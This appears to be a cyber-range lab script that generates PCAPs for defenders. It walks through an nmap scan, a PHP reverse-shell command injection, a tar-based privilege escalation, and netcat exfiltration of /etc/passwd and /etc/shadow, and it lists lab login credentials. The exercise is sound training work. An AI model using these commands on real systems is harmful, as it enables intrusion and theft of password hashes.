@@ -1,0 +1,90 @@
+PCAP instructions
+
+On the acn go to CPT/BAD_GUY/Files
+
+Go to CVTE-CPT and open Defender boxes .95 and .96
+>>>>>>>defender
+>>>>>>>password
+
+Open up Wireshark
+Scroll to SSH cogwheel and click it
+Change the SSH Server to the WAN router IP (172.24.20.1) 
+Change the Port to 20222
+Authentication TAB
+>>atropia_admin
+>>HardPassword
+Next TAB 
+>>sudo
+>>eth0 and the other screen eth1
+
+Click SAVE
+
+Go to CVTE and open up Entity UAV
+>>>>>>vlad
+>>>>>>123qwe
+
+Systemtools
+LXterminal and run an nmap scan as sudo of the Atropia WAN router
+change the XX's to the correct octets
+
+>>>>>START WIRESHARK ON DEFENDER BOX TO CAPTURE SCAN TRAFFIC<<<
+From Vlad's:
+sudo nmap -Pn -n -O -sT -sV 10.50.161.1 -p-
+
+Notice port 8080 is open
+
+Go to Firefox and type Http://10.50.X.X:8080
+>>>10.50.x.x is (WAN_ROUTER IP)
+
+Vlads terminal open up a listener to get a shell from the webpage
+nc -lvp 1234
+
+On the Webpage type
+
+;php -r '$sock=fsockopen(“10.50.160.5”,1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Where 10.50.160.5 is DMZ's router IP verify on Topology
+
+On Vlads terminal you should get a $ sign
+
+In order to get a bash shell, run the below command ;
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+
+find / -user root -perm -4000 2>/dev/null
+
+Use the "tar shell" from gtfobins
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+from another terminal run 
+vlad: # nc -lvp 2345 > passwd
+
+then back to the tarshell
+shell: $ nc 10.50.160.5 2345 < /etc/passwd
+
+back to vlad control+C and ls to ls
+verify file received
+then do the same for the shadow file
+vlad: # nc -lvp 2345 > shadow
+shell: cat /etc/shadow > /tmp/shadow
+shell: $ nc 10.50.160.5 2345 < /tmp/shadow
+
+*************************************************
+send it from the tar shell
+shell: $ nc 10.50.160.5 2345 < /etc/shadow
+*************************************************
+back to Vlad's to stop the listener and verify with ls
+
+stop the pcaps on the defender boxes
+save the pcaps on the defender boxes
+
+File
+Save as
+Computer
+home defender
+pcap0 for the 95 pcap1 for the 96
+
+
+
